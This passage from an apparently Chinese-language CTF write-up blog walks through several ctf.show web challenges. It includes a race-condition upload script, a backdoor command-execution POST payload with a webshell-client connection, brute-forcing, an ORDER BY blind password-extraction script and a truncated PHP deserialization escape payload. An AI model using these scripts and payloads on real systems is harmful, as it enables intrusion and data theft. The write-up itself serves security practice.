class="number">200</span>   <span class="number">576</span>B   https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/web.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/website.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wordpress.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wp-config.php.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wp.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wwwroot.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/www.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/zipkin/</span><br></pre></td></tr></table></figure></div>
<p>搜索zip的文件，然后把这个web.zip下载下来 ， 这是网站源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></div>
<p>可以看到中源码中有对token做判断。可以抓包看看，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/check.php?token=1f0e3dad99908345f7439f8ffabdffc4&amp;php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>27</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show/vb.zip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-nginx"><span class="attribute">username</span> or password <span class="literal">error</span>!</span></span><br></pre></td></tr></table></figure></div>
<p>发现在第一行这里确实跟了一个token 我解密出来这个md5对应的值是19<br>源码中的逻辑是设置了一个 receivefile 为 flag.dat，然后调用 receiveStreamFile($receiveFile);，可以发现是需要用 php:&#x2F;&#x2F;input 获取文件流，然后返回一个文件，接下来需要自己传上去的文件与已存在的 key.dat 的 MD5 要一致，sha512 不一致，即可打印出 flag<br>所以首先要获取这个key.dat 可以从url处直接下载  接下来我们上传的文件的md5要一样 sha512不一样 需要用python实现</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化</span></span><br><span class="line">i = <span class="built_in">str</span>(time.localtime().tm_min)</span><br><span class="line"><span class="comment"># 生成token</span></span><br><span class="line">m = hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">url = <span class="string">&quot;https://ad0204ed-4869-4879-96b1-fa5681393cdb.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&quot;</span>.<span class="built_in">format</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something went wrong!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/kakeru/ctf/key.dat&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> t:</span><br><span class="line">    data1 = t.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=POST, args=(data1,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    data2 = <span class="string">&#x27;emmmmm&#x27;</span></span><br><span class="line">    threading.Thread(target=POST, args=(data2,)).start()</span><br></pre></td></tr></table></figure></div>
<h1 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h1><p><img src="https://pic1.imgdb.cn/item/67ac63a3d0e0a243d4fe97df.png"><br>题目就给了一个phpinfo的界面，没有什么信息，用dirsearch扫描一下目录 扫一下PHP文件<br>这题考查的是.git泄漏   目录扫描之后会找到一个&#x2F;.git&#x2F;index文件<br>在linux中查看这个index的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DIRC</span>^J??<span class="number">9</span>??^Jw?!&#x27;???U??<span class="number">0</span>wQW?<span class="number">8</span>??&gt;&amp;?=??&lt;&lt;</span><br><span class="line"></span><br><span class="line">                                       <span class="attribute">backdoor</span>.php^J??<span class="number">8</span>?ь^Jw? ?<span class="number">1</span>???Am<span class="string">&quot;?~?]?I???t? ??? index.phpTREE2 0</span></span><br></pre></td></tr></table></figure></div>
<p>有一个backdoor.php文件，去看看是什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 36D姑娘留的后门，闲人免进 --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>页面返回内容是这个，说明有个后门，但是不知道具体什么，这里后门是英文单词的后门Letmein （不知道怎么得到的）<br>hackbar post传入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Letmein</span><span class="operator">=</span>print_r (glob (<span class="string">&quot;*&quot;</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>得到<code>Array ( [0] =&gt; backdoor.php [1] =&gt; index.php )</code><br>用蚁剑连接之后在&#x2F;var&#x2F;www目录下面有flag.txt<br><img src="https://pic1.imgdb.cn/item/67ac65efd0e0a243d4fe9925.png" alt="|500"><br>用hackbar中手动用highlight_file查看 得到flag<br><img src="https://pic1.imgdb.cn/item/67ac65f6d0e0a243d4fe9929.png" alt="|475"></p>
<h1 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h1><p>bp抓包然后爆破密码 得到密码之后登录<br><img src="https://pic1.imgdb.cn/item/67ac6606d0e0a243d4fe992d.png"></p>
<p>在页面的网络中有一个flag请求头，然后base64解码就能得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;Y3Rmc2hvd3tjZTBhNmI3Ni1jMGQxLTQyNWMtYjU0NC0yOTg5ZmVmNmFjZTN9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"></span><br><span class="line">ctfshow&#123;ce0a6b76-c0d1-425c-b544-2989fef6ace3&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h1><p>题目还是一个登录界面，但是可以注册，注册一个账号登录进去，有显示一个flag的信息<br><img src="https://pic1.imgdb.cn/item/67ac65fcd0e0a243d4fe992b.png"><br>但是没有什么多余信息<br>用dirsearch扫到一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载下来就是网页的源代码<br>login.php这个源码中显示禁了很多字符，所以无法sql注入<br>在user_main.php中有关键代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">?</span>php</span><br><span class="line">    <span class="keyword">if</span> (isset($_SESSION[<span class="string">&quot;login&quot;</span>]) <span class="operator">&amp;&amp;</span> $_SESSION[<span class="string">&quot;login&quot;</span>] <span class="operator">==</span><span class="operator">=</span> <span class="literal">true</span>) &#123;</span><br><span class="line">        $con <span class="operator">=</span> mysqli_connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span>$con) &#123;</span><br><span class="line">            die(&#x27;Could not <span class="params">connect:</span> &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $order <span class="operator">=</span> $_GET[&#x27;order&#x27;];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($order) <span class="operator">&amp;&amp;</span> strlen($order) <span class="operator">&lt;</span> <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|<span class="char escape_">\,</span>|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\（</span>|<span class="char escape_">\）</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\’</span>|<span class="char escape_">\“</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\?</span>|<span class="char escape_">\,</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $order)) &#123;</span><br><span class="line">                die(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $sql <span class="operator">=</span> <span class="string">&quot;select * from user order by $order&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql <span class="operator">=</span> <span class="string">&quot;select * from user order by id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="operator">?</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>如果我们把order&#x3D;pwd，就可以一直注册，根据密码排序，得到flag。<br>因为这里用orderby排序了，所以可以让我们注册的密码和flag的密码进行比较<br>一段来自网上的脚本:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://69ffa319-8ced-4173-8a89-71f4446243aa.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reg(password):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: password, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = requests.post(<span class="attribute">url</span>=url + <span class="string">&quot;reg.php&quot;</span>, <span class="attribute">data</span>=data, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == 302:</span><br><span class="line">        return <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    #<span class="built_in"> proxy </span>= &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.post(<span class="attribute">url</span>=url + <span class="string">&quot;login.php&quot;</span>, <span class="attribute">data</span>=data, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line">    # <span class="built_in">print</span>(r.headers)</span><br><span class="line">    <span class="keyword">if</span> r.headers[<span class="string">&quot;location&quot;</span>] == <span class="string">&quot;/user_main.php?order=id&quot;</span>:</span><br><span class="line">        return s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login error!&quot;</span>)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line">reg(hashlib.md5(<span class="string">&quot;check&quot;</span>.encode()).hexdigest())</span><br><span class="line">session = login(hashlib.md5(<span class="string">&quot;check&quot;</span>.encode()).hexdigest(), <span class="string">&quot;check&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwd = [<span class="string">&quot;-&quot;</span>] * 100</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pwd)):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        pwd[i] = key[x]</span><br><span class="line">        _pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">        <span class="keyword">if</span> reg(_pwd):</span><br><span class="line">            r = session.<span class="built_in">get</span>(<span class="attribute">url</span>=url + <span class="string">&quot;user_main.php?order=pwd&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> _pwd <span class="keyword">in</span> r.text.split(<span class="string">&quot;flag_is_my_password&quot;</span>)[1]:</span><br><span class="line">                pwd[i] = key[x - 1]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(pwd))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></div>
<p> 但是我用了网上的几个脚本都只能解密到一半就报错了。还是以后等自己python学好了写自己的脚本吧</p>
<h1 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h1><p><img src="https://pic1.imgdb.cn/item/67ac664cd0e0a243d4fe9949.png"><br>题目是一个登录系统，提示成员留后门。随便输入了一个用户名和密码提示用户不存在，输入admin用户提示密码错误，所以先尝试能不能爆破。爆破失败，但是扫描目录发现<a target="_blank" rel="noopener" href="http://www.zip下载下来之后可以得到网页的源码./">www.zip下载下来之后可以得到网页的源码。</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>要想登录成功就要让session [login]&#x3D;1<br>后面的代码审计和反序列化字符逃逸对我来还是太难了，详情可以看这篇博客<a href="ttps://www.cnblogs.com/aninock/p/15408090.html"># <a target="_blank" rel="noopener" href="https://www.cnblogs.com/aninock/p/15408090.html" title="发布于 2021-10-14 19:12">CTFSHOW - 日刷 - game-gyctf web2&#x2F;pop 链 - 反序列字符逃逸</a></a><br>最后在?action&#x3D;update界面上传post数据<br>payload: </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">18</span>&amp;nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>Use<span class="string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> from user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span 